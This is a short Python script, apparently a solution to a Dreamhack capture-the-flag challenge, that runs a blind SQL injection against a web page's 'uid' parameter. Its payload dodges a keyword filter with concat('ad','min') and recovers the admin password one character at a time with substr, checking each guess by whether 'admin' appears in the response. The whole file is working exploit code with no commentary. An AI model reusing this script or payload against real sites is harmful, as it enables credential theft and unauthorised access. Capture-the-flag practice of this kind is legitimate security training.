from requests import get
from bs4 import BeautifulSoup
from urllib.parse import quote

def extract_password_char_by_char(host):
    result = ""
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-={}[]|\\:;\"'<>,.?/~`"

    for position in range(1, 101):
        for char in chars:
            query = f"'||uid=concat('ad','min')&&substr(upw,{position},1)='{char}'#"
            encoded_query = quote(query)
            
            url = f"{host}?uid={encoded_query}"
            response = get(url)
            html_content = response.text
            soup = BeautifulSoup(html_content, 'html.parser')
            
            html_text = soup.get_text()
            if 'admin' in html_text:
                result += char
                print(f"password: {result}")
                break
        else:
            print(f"Failed to find character at position {position}")
            break
            
    print(f"final password: {result}")
    return result

host_url = "http://host8.dreamhack.games:19061/"
password = extract_password_char_by_char(host_url)